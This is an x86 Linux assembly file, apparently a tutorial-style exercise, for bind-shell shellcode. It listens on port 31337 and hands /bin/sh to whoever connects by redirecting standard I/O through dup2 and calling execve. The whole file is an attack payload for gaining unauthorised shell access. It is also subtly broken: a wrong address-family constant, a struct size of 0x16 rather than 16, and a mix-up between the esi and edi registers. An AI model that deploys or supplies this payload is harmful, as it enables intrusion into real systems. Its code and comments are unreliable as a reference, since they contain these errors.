BITS 32 	
; s = socket(2, 1, 0)
push BYTE 0x66; syscall for the socketcall #102 
pop eax 
cdq ; Zero out edx for use as a null DWORD 
xor ebx, ebx 
inc ebx ; increament ebx for the type of syscall = 1 = socket()
push edx ; first argument from the right
push BYTE 0x1 ; second argument from the right = SOCK_STREAM
push BYTE 0x2 ; third argument from the right = AF_INET
mov ecx, esp ; move the pointer to the arguments from esp to ecx 
int 0x80; After syscall eax has value of s 
mov esi, eax ; save the value of s into esi 

;bind(s, [2, 31337. 0], 16)
push BYTE 0x66; syscall for the socketcall #102 
pop eax 
inc ebx ; increament ebx for the type of syscall = 1 = bind()
push edx; the middle arg first from rigth push 0
push WORD 0x697a;  the middle arg second from rigth push 31337
push WORD 0xb; the middle arg third from rigth push = AF_INET
mov ecx, esp ; now the ecx hold the pointer for the middle args 
push BYTE 0x16 ; from the right of the whole arguments  sizeof(server struct) = 16
push ecx; oush the middle args pointer 
push esi; the socket file descriptor 
mov ecx, esp; ecx = has the argmunt array bind(s, [2, 31337. 0], 16)
int 0x80 ; call bind eax = 0 on success 

;lisnten (s, 0)
mov BYTE al, 0x66 ; we move here because eax would be 0 After bind 
inc ebx
inc ebx 
push  ebx; args{BACKLOG = 4
push edi ;   sockfd = edi  }
mov ecx, esp ; puth the args pointer to ecx 
int 0x80 ; call bind eax = 0 on success

;c = accept(s, 0, 0)
mov BYTE al, 0x66 ; we move here because eax would be 0 After bind 
inc ebx 
push edx;  argv{  socklen = 0
push edx;  sockaddr ptr = NULL
push edi;       s}
mov ecx, esp ; puth the args pointer to ecx 
int 0x80 ; eax will store the value of accept in c 


; dup2(connected socket, {all three standard I/O file descriptors})

xchg eax, ebx ;move put the FD in ebx , and put 0x5 in eax 
push BYTE 0x2; ecx starts at 2 
pop ecx ; ecx = 2

dup_loop:
mov BYTE al ,0x3F ; dup2 syscall #63
int 0x80; dup2 (c, 2)
dec ecx; 
jns dup_loop;  ecx is not negative


; execve(const char *filename, char *const argv [], char *const envp[])
mov BYTE al, 11   ; execve  syscall #11
push edx          ; push some nulls for string termination
push 0x68732f2f   ; push "//sh" to the stack
push 0x6e69622f   ; push "/bin" to the stack
mov ebx, esp      ; put the address of "/bin//sh" into ebx, via esp
push edx          ; push 32-bit null terminator to stack
mov edx, esp      ; this is an empty array for envp
push ebx          ; push string addr to stack above null terminator
mov ecx, esp      ; this is the argv array with string ptr
int 0x80 ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])